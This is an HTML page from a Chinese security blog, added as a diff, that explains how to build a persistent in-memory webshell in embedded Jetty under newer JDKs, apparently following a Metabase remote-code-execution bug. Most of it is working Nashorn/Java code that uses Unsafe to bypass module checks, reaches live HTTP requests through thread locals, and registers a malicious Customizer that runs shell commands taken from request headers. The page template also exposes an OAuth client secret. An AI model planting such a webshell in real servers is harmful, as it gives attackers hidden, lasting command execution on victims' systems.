@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta name="referrer" content="never">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      一种在高版本JDK下 的新型嵌入式Jetty Customizer内存马实现 - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="toc-text">回显马构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="toc-text">内存马构造</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">一种在高版本JDK下 的新型嵌入式Jetty Customizer内存马实现</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2023/08/19</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/WEB">WEB</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/WEB">WEB</a>
+                  
+                
+                  
+                    <a href="/tags/CVE">CVE</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h1 id="前言">前言<a class="post-anchor" href="#前言"></a></h1><p>之前在Metabase 漏洞中实现了任意js脚本的执行,但是这并不优雅 每次都要发送完整的请求包.<br>Metabase 的部署方法比较特殊 它打包成了一个独立jar来运行. 这意味着不能通过简单的写文件的方法来获得较为持久化的webshell.<br>那么在这种情况下如何实现一个内存马呢?</p>
+<span id="more"></span>
+<h1 id="回显马构造">回显马构造<a class="post-anchor" href="#回显马构造"></a></h1><p>目标环境是 java 11.0.19+7  中间件是 Jetty 11.0.14<br>sink点是nashorn js引擎  下面例子都是js nashorn代码的实现<br>因为js引擎没有传入http请求的上下文 所以只能通过遍历线程的方法来获取上下文.</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">var</span> threadGroup = java.lang.Thread.currentThread().getThreadGroup();<br><span class="hljs-keyword">var</span> field = ThreadGroup.class.getDeclaredField(<span class="hljs-string">"threads"</span>);<br>field.setAccessible(<span class="hljs-keyword">true</span>);<br></code></pre></td></tr></tbody></table></figure>
+<p>发现setAccessible执行的时候抛出了异常</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">Caused by: java.lang.reflect.InaccessibleObjectException: <br>Unable to make field java.lang.Thread[] java.lang.ThreadGroup.threads accessible:<br>module java.base does not "opens java.lang" to module jdk.scripting.nashorn.scripts<br></code></pre></td></tr></tbody></table></figure>
+<p>Java 9 及其以上的版本中 模块化系统(module system)被引入。模块化系统增加了对模块的隔离和访问控制，强制要求模块显式地声明对其他模块的公开与开放。<br>因为这个新增的安全特性.所以不能像在低版本java一样简单的通过反射的方法来访问私有属性.<br>但是仍然可以使用unsafe来强制访问私有属性绕过这个限制.<br>sun.misc.Unsafe 是 JDK 原生提供的一个工具类，包含了危险的方法例如内存分配与回收、CAS 操作、类实例化、内存屏障等。正如其命名一样，由于其可以直接操作内存，执行底层系统调用，其提供的操作也是比较危险的。  </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getunsafe</span>(<span class="hljs-params"></span>) </span>{<br>  <span class="hljs-keyword">var</span> unsafe = java.lang.Class.forName(<span class="hljs-string">"sun.misc.Unsafe"</span>).getDeclaredField(<span class="hljs-string">"theUnsafe"</span>);<br>  unsafe.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-keyword">return</span> unsafe.get(<span class="hljs-literal">null</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690788912875-9713656f-4062-488f-9842-dad7c5a823ec.png#averageHue=%23f8f8f7&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;id=udd11c383&amp;originHeight=1032&amp;originWidth=2306&amp;originalType=url&amp;ratio=1.5&amp;rotation=0&amp;showTitle=true&amp;size=290233&amp;status=done&amp;style=none&amp;taskId=u3ce10b37-b6c6-419c-be20-8b105875c31&amp;title=Java%E9%AD%94%E6%B3%95%E7%B1%BB%EF%BC%9AUnsafe%E5%BA%94%E7%94%A8%E8%A7%A3%E6%9E%90%20%E7%92%90%E7%92%90%20https%3A%2F%2Ftech.meituan.com%2F2019%2F02%2F14%2Ftalk-about-java-magic-class-unsafe.html" data-caption="Java魔法类：Unsafe应用解析 璐璐 https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690788912875-9713656f-4062-488f-9842-dad7c5a823ec.png#averageHue=%23f8f8f7&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;id=udd11c383&amp;originHeight=1032&amp;originWidth=2306&amp;originalType=url&amp;ratio=1.5&amp;rotation=0&amp;showTitle=true&amp;size=290233&amp;status=done&amp;style=none&amp;taskId=u3ce10b37-b6c6-419c-be20-8b105875c31&amp;title=Java%E9%AD%94%E6%B3%95%E7%B1%BB%EF%BC%9AUnsafe%E5%BA%94%E7%94%A8%E8%A7%A3%E6%9E%90%20%E7%92%90%E7%92%90%20https%3A%2F%2Ftech.meituan.com%2F2019%2F02%2F14%2Ftalk-about-java-magic-class-unsafe.html" alt="Java魔法类：Unsafe应用解析 璐璐 https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html"></a>这里使用到其中了两个方法</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//基于相对内存地址直接读取属性 不受所有修饰符限制</span><br>public <span class="hljs-built_in">Object</span> getObject(<span class="hljs-built_in">Object</span> o, long offset)<br><span class="hljs-comment">//获取非静态属性在它的类的内存分配中的位置(内存偏移地址)</span><br>public long objectFieldOffset(Field f)<br></code></pre></td></tr></tbody></table></figure>
+<p>拿到unsafe之后就可以获取之前获取不到的threads了</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> unsafe = getunsafe();<br><span class="hljs-keyword">var</span> group = java.lang.Thread.currentThread().getThreadGroup();<br><span class="hljs-keyword">var</span> f = group.getClass().getDeclaredField(<span class="hljs-string">"threads"</span>);<br><span class="hljs-keyword">var</span> threads = unsafe.getObject(group, unsafe.objectFieldOffset(f));<br></code></pre></td></tr></tbody></table></figure>
+<p>通过调试找到http上下文 _request的位置<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690788496932-e6bced32-18da-4050-a8bc-a1e77ffd5931.png#averageHue=%233b3f42&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;height=408&amp;id=uf06321cd&amp;originHeight=612&amp;originWidth=2427&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=174501&amp;status=done&amp;style=none&amp;taskId=u9c912400-e4ef-450c-b9e4-3ccc70cdc8c&amp;title=&amp;width=1618" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690788496932-e6bced32-18da-4050-a8bc-a1e77ffd5931.png#averageHue=%233b3f42&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;height=408&amp;id=uf06321cd&amp;originHeight=612&amp;originWidth=2427&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=174501&amp;status=done&amp;style=none&amp;taskId=u9c912400-e4ef-450c-b9e4-3ccc70cdc8c&amp;title=&amp;width=1618" alt="图片.png"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690789815928-5cdce953-a5c3-430e-a90b-c73cf0253bdc.png#averageHue=%233d4145&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;height=758&amp;id=ufe84bffc&amp;originHeight=1137&amp;originWidth=2493&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=339690&amp;status=done&amp;style=none&amp;taskId=uead94df8-fa2f-441b-943a-8cddda5031d&amp;title=&amp;width=1662" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690789815928-5cdce953-a5c3-430e-a90b-c73cf0253bdc.png#averageHue=%233d4145&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;height=758&amp;id=ufe84bffc&amp;originHeight=1137&amp;originWidth=2493&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=339690&amp;status=done&amp;style=none&amp;taskId=uead94df8-fa2f-441b-943a-8cddda5031d&amp;title=&amp;width=1662" alt="图片.png"></a><br>((HttpChannelOverHttp)((HttpConnection)((Thread)this).threadLocals.table[x].value)._channel)._request<br>不难发现_request _response 可以通过如下方式获取<br>((HttpConnection)((Thread)this).threadLocals.table[x].value).getHttpChannel().getResponse()<br> 遍历threads 找到threadLocals-&gt;table-&gt;value 调用其中的getHttpChannel方法 就可以拿到我们需要的东西</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; threads.length; i++) {<br>	<span class="hljs-keyword">try</span> {<br>		<span class="hljs-keyword">var</span> f = threads[i].getClass().getDeclaredField(<span class="hljs-string">"threadLocals"</span>);<br>		<span class="hljs-keyword">var</span> threadLocals = unsafe.getObject(threads[i], unsafe.objectFieldOffset(f));<br>		<span class="hljs-keyword">var</span> table = unsafe.getObject(threadLocals, unsafe.objectFieldOffset(threadLocals.getClass().getDeclaredField(<span class="hljs-string">"table"</span>)));<br>		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; table.length; j++) {<br>			<span class="hljs-keyword">try</span> {<br>				<span class="hljs-keyword">var</span> valueField = unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="hljs-string">"value"</span>)));<br>				<span class="hljs-keyword">var</span> w = valueField.getHttpChannel().getResponse().getWriter();<br>				w.println(exec(valueField.getHttpChannel().getRequest().getHeader(<span class="hljs-string">"cmd"</span>)));<br>				w.flush();<br>			} <span class="hljs-keyword">catch</span>(e) {<br><br>}<br>		}<br>	} <span class="hljs-keyword">catch</span>(e) {<br><br>}<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690792720005-4ed8c557-67cf-4998-8218-bd56b80a8b9f.png#averageHue=%23e9edf1&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;height=572&amp;id=ub0341756&amp;originHeight=858&amp;originWidth=2440&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=312095&amp;status=done&amp;style=none&amp;taskId=u5de0a38b-e898-440b-ac3c-a407fe3831e&amp;title=&amp;width=1626.6666666666667" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690792720005-4ed8c557-67cf-4998-8218-bd56b80a8b9f.png#averageHue=%23e9edf1&amp;clientId=u8d0b7e8e-1af6-4&amp;from=paste&amp;height=572&amp;id=ub0341756&amp;originHeight=858&amp;originWidth=2440&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=312095&amp;status=done&amp;style=none&amp;taskId=u5de0a38b-e898-440b-ac3c-a407fe3831e&amp;title=&amp;width=1626.6666666666667" alt="图片.png"></a><br>到这里我们实现了一个回显马</p>
+<h1 id="内存马构造">内存马构造<a class="post-anchor" href="#内存马构造"></a></h1><p>那么如何实现一个内存马呢?<br>跟踪代码堆栈 发现在分发http请求的时候有这么一段代码<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690793618610-5062777f-a98c-4c01-8405-1c6b5d323464.png#averageHue=%23514d42&amp;clientId=u7016d437-a395-4&amp;from=paste&amp;height=686&amp;id=u8e2924cd&amp;originHeight=1029&amp;originWidth=2394&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=331574&amp;status=done&amp;style=none&amp;taskId=u869d6c43-0b19-4a5a-a996-d0eac0a6ea0&amp;title=&amp;width=1596" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690793618610-5062777f-a98c-4c01-8405-1c6b5d323464.png#averageHue=%23514d42&amp;clientId=u7016d437-a395-4&amp;from=paste&amp;height=686&amp;id=u8e2924cd&amp;originHeight=1029&amp;originWidth=2394&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=331574&amp;status=done&amp;style=none&amp;taskId=u869d6c43-0b19-4a5a-a996-d0eac0a6ea0&amp;title=&amp;width=1596" alt="图片.png"></a></p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">handle</span><span class="hljs-params">()</span> </span>{<br>......<br><span class="hljs-keyword">this</span>.dispatch(DispatcherType.REQUEST, () -&gt; {<br>Iterator var1 = <span class="hljs-keyword">this</span>._configuration.getCustomizers().iterator();<br>  <span class="hljs-keyword">do</span> {<br><span class="hljs-keyword">if</span> (!var1.hasNext()) {<br>  <span class="hljs-keyword">this</span>.getServer().handle(<span class="hljs-keyword">this</span>);<br><span class="hljs-keyword">return</span>;<br> }<br>      HttpConfiguration.Customizer customizer = (HttpConfiguration.Customizer)var1.next();<br>      customizer.customize(<span class="hljs-keyword">this</span>.getConnector(), <span class="hljs-keyword">this</span>._configuration, <span class="hljs-keyword">this</span>._request);<br>  } <br>    <span class="hljs-keyword">while</span>(!<span class="hljs-keyword">this</span>._request.isHandled());<br>});<br>......<br></code></pre></td></tr></tbody></table></figure>
+<p>jetty 有一类叫做 customizer 的handler 看起来和tomcat的Valve类似 </p>
+<blockquote>
+<p>HttpConfiguration.Customizer<br>允许自定义请求对象的接口 对于特定的 HTTP 连接器配置。 与过滤器不同，定制器是在提交请求进行处理之前应用，并且可以特定于接收请求的连接器。<br>通常customizer执行以下任务： </p>
+<ul>
+<li>处理可能由代理或负载均衡器注入的标头字段。 </li>
+<li>可能来自连接/连接器的设置属性，例如 SSL 会话 ID </li>
+<li>如果请求已被卸载，则允许将请求标记为安全或经过身份验证 并通过 header、cookie 或其他带外机制进行通信 </li>
+<li>设置由连接器确定的请求属性/字段请求已收到</li>
+</ul>
+</blockquote>
+<p>实现一个Customizer</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">var</span> ProxyCustomizer = Java.extend(org.eclipse.jetty.server.HttpConfiguration.Customizer, {<br>	customize: function(connector, channelConfig, request) {<br>		<span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">"cmd1"</span>) != <span class="hljs-keyword">null</span>) {<br>			request.getResponse().getWriter().println(exec(request.getHeader(<span class="hljs-string">"cmd1"</span>)));<br>			request.setHandled(<span class="hljs-keyword">true</span>);<br>		}<br>	}<br>});<br></code></pre></td></tr></tbody></table></figure>
+
+<p>将自定义恶意Customizer添加到Configuration中</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java">valueField.getHttpChannel().getHttpConfiguration().addCustomizer(<span class="hljs-keyword">new</span> ProxyCustomizer());<br></code></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690794498674-24249c31-0be4-49ad-a3e3-968a7aa0085d.png#averageHue=%2385cbca&amp;clientId=u7016d437-a395-4&amp;from=paste&amp;height=362&amp;id=u0719ff71&amp;originHeight=543&amp;originWidth=2224&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=89441&amp;status=done&amp;style=none&amp;taskId=u2b8de0f9-4271-4e35-baf9-125d6e89649&amp;title=&amp;width=1482.6666666666667" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690794498674-24249c31-0be4-49ad-a3e3-968a7aa0085d.png#averageHue=%2385cbca&amp;clientId=u7016d437-a395-4&amp;from=paste&amp;height=362&amp;id=u0719ff71&amp;originHeight=543&amp;originWidth=2224&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=89441&amp;status=done&amp;style=none&amp;taskId=u2b8de0f9-4271-4e35-baf9-125d6e89649&amp;title=&amp;width=1482.6666666666667" alt="图片.png"></a>现在已经实现了一个简单的java内存马<br> 之后照猫画虎 魔改一下哥斯拉的马 稍微封装一下  最后用unsafe绕过限制 加载class 这里留给读者自己动手实现<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690877525272-4a0dc3cd-933d-4d14-96b1-c6cf2b9dae1e.png#averageHue=%2370b771&amp;clientId=u53760324-b34d-4&amp;from=paste&amp;height=512&amp;id=u9e2c0983&amp;originHeight=768&amp;originWidth=2444&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=426633&amp;status=done&amp;style=none&amp;taskId=uc52e70ef-1c9c-4b92-a0a4-d09d4b397eb&amp;title=&amp;width=1629.3333333333333" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690877525272-4a0dc3cd-933d-4d14-96b1-c6cf2b9dae1e.png#averageHue=%2370b771&amp;clientId=u53760324-b34d-4&amp;from=paste&amp;height=512&amp;id=u9e2c0983&amp;originHeight=768&amp;originWidth=2444&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=426633&amp;status=done&amp;style=none&amp;taskId=uc52e70ef-1c9c-4b92-a0a4-d09d4b397eb&amp;title=&amp;width=1629.3333333333333" alt="图片.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690872994898-8f444f0d-99d9-4c08-a61b-cf83f9dfc249.png#averageHue=%23f0f0ef&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=520&amp;id=u53995463&amp;originHeight=780&amp;originWidth=733&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=47389&amp;status=done&amp;style=none&amp;taskId=u97ef4e7b-e797-43d8-b87c-577245ea62e&amp;title=&amp;width=488.6666666666667" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690872994898-8f444f0d-99d9-4c08-a61b-cf83f9dfc249.png#averageHue=%23f0f0ef&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=520&amp;id=u53995463&amp;originHeight=780&amp;originWidth=733&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=47389&amp;status=done&amp;style=none&amp;taskId=u97ef4e7b-e797-43d8-b87c-577245ea62e&amp;title=&amp;width=488.6666666666667" alt="图片.png"></a><br>成功实现哥斯拉内存马<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690873112280-66d892ff-2076-40c6-9d4a-61e1a0b86490.png#averageHue=%23faf9f8&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=680&amp;id=u6d84af6f&amp;originHeight=1020&amp;originWidth=2535&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=133790&amp;status=done&amp;style=none&amp;taskId=u820831f9-3e23-449e-9150-ec70b9a3eb8&amp;title=&amp;width=1690" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690873112280-66d892ff-2076-40c6-9d4a-61e1a0b86490.png#averageHue=%23faf9f8&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=680&amp;id=u6d84af6f&amp;originHeight=1020&amp;originWidth=2535&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=133790&amp;status=done&amp;style=none&amp;taskId=u820831f9-3e23-449e-9150-ec70b9a3eb8&amp;title=&amp;width=1690" alt="图片.png"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690873132494-7539c2cc-654d-4ae7-8072-07cf252673be.png#averageHue=%233d3d3d&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=438&amp;id=uaaf4f233&amp;originHeight=657&amp;originWidth=1697&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=45252&amp;status=done&amp;style=none&amp;taskId=u30720f24-f3b1-4f96-bd82-ef9132087fd&amp;title=&amp;width=1131.3333333333333" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690873132494-7539c2cc-654d-4ae7-8072-07cf252673be.png#averageHue=%233d3d3d&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=438&amp;id=uaaf4f233&amp;originHeight=657&amp;originWidth=1697&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=45252&amp;status=done&amp;style=none&amp;taskId=u30720f24-f3b1-4f96-bd82-ef9132087fd&amp;title=&amp;width=1131.3333333333333" alt="图片.png"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690873137174-c16ee090-32db-4eed-a0e1-65b2c0cdf969.png#averageHue=%23f8f8f7&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=602&amp;id=ucaf6d60d&amp;originHeight=903&amp;originWidth=2527&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=151121&amp;status=done&amp;style=none&amp;taskId=u7f09b33d-86cc-4370-827b-286e06d57c4&amp;title=&amp;width=1684.6666666666667" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2023/png/25577536/1690873137174-c16ee090-32db-4eed-a0e1-65b2c0cdf969.png#averageHue=%23f8f8f7&amp;clientId=u0ec00b88-0b9c-4&amp;from=paste&amp;height=602&amp;id=ucaf6d60d&amp;originHeight=903&amp;originWidth=2527&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=151121&amp;status=done&amp;style=none&amp;taskId=u7f09b33d-86cc-4370-827b-286e06d57c4&amp;title=&amp;width=1684.6666666666667" alt="图片.png"></a></p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2023/07/28/Metabase-CVE-2023-38646/">Metabase 远程代码执行漏洞分析  & 一种补丁绕过方法  CVE-2023-38646</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2023/08/19/Jetty-Customize-memory-webshell/">https://rce.moe/2023/08/19/Jetty-Customize-memory-webshell/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '1488ae49eda310270a91',
+        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
+        repo: 'hexoblog',
+        owner: 'burpheart',
+        admin: 'burpheart',
+        id: md5(location.pathname),
+        distractionFreeMode: true,
+        proxy: 'https://servelesscors.rce.moe/api/cors?url=https://github.com/login/oauth/access_token'
+    }).render('gitalk-container')
+</script>
+        <footer>
+          <div class="copyright">
+            ©2023
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
